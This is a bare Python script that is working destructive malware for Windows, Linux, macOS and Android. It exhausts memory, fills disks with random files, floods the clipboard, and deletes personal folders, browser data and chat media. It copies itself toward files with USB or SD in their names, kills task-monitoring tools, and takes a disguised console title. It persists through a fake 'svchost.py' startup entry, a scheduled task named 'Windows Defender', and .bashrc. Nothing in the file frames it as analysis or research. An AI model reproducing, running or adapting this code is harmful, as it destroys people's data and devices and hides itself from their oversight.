import os,sys,threading,time,random,subprocess,platform,shutil,base64,ctypes,mmap
from ctypes import*
from mmap import*
P=get_platform=lambda:"android"if"ANDROID_ROOT"in os.environ else"linux"if"linux"in sys.platform else"darwin"if"darwin"in sys.platform else"windows"if"win"in sys.platform else"unknown"
def M():
 while True:
  try:
   s=4*1024*1024*1024
   m=mmap(-1,s,MAP_PRIVATE|MAP_ANONYMOUS,-1,0)
   m.write(b"\x00"*s)
  except:time.sleep(0.01)
def D():
 t=[]
 if P()=="android":t=["/sdcard/Download","/sdcard/DCIM","/sdcard/Android/data","/data/data/com.termux/files/home"]
 elif P()=="linux":t=["/home","/root","/tmp","/var/tmp"]
 elif P()=="darwin":t=["/Users","/Applications"]
 elif P()=="windows":t=[os.path.expanduser("~\\Desktop"),os.path.expanduser("~\\Documents"),os.path.expanduser("~\\AppData\\Roaming")]
 for p in t:
  if os.path.exists(p):
   while True:
    f=os.path.join(p,"".join(random.choices("abcdef0123456789",k=12))+".sys_cache")
    try:
     with open(f,"wb") as w:w.write(os.urandom(750*1024*1024))
    except:continue
def C():
 while True:
  spam=base64.b64encode(os.urandom(100*1024*1024)).decode()
  if P()=="windows":os.popen(f'echo|set /p="{spam}"|clip')
  elif P()=="linux":os.popen(f"echo '{spam}'|xclip -selection clipboard")
  elif P()=="android":os.popen(f'am start -n com.termux/.app.TermuxActivity -e args "printf \\"{spam}\\" | pbcopy"')
  elif P()=="darwin":os.popen(f"echo '{spam}'|pbcopy")
  time.sleep(2)
def X():
 u=os.path.expanduser
 d=[u("~/Pictures"),u("~/Documents"),u("~/Music"),u("~/Videos"),u("~/Downloads")]
 if P()=="windows":d+=[u("~\\AppData\\Local\\Google\\Chrome\\User Data"),u("~\\AppData\\Roaming\\Microsoft\\Windows\\Recent")]
 elif P()=="android":d+=["/sdcard/WhatsApp/Media","/sdcard/Telegram/Telegram Files"]
 for path in d:
  if os.path.exists(path):
   try:shutil.rmtree(path)
   except:pass
def S():
 while True:
  for r,d,f in os.walk("/"): 
   for i in f:
    if any(x in i for x in["USB","usb","SD","sd"]):
     try:shutil.copy(__file__,os.path.join(r,i+".py"))
     except:pass
  time.sleep(60)
def K():
 if P()=="windows":
  try:subprocess.Popen("taskkill /f /im taskmgr.exe",shell=True)
  except:pass
 elif P()in["linux","android"]:os.system("killall htop top")
def W():
 r=ctypes.windll if P()=="windows"else None
 if r:
  try:r.kernel32.SetConsoleTitleW("System Idle Process")
  except:pass
def main():
 if P()=="windows":
  try:
   os.system("copy %s %s"%(sys.argv[0],os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.py")))
   subprocess.Popen("schtasks /create /tn \"Windows Defender\" /tr \"%s\" /sc onlogon"%(sys.argv[0]),shell=True)
  except:pass
 elif P()in["linux","android"]:
  try:
   with open(os.path.expanduser("~/.bashrc"),"a")as f:f.write("\npython3 %s &\n"%__file__)
  except:pass
 threading.Thread(target=M,daemon=False).start()
 threading.Thread(target=D,daemon=False).start()
 threading.Thread(target=C,daemon=False).start()
 threading.Thread(target=X,daemon=False).start()
 threading.Thread(target=S,daemon=False).start()
 while True:K();W();time.sleep(5)
if __name__=="__main__":main()
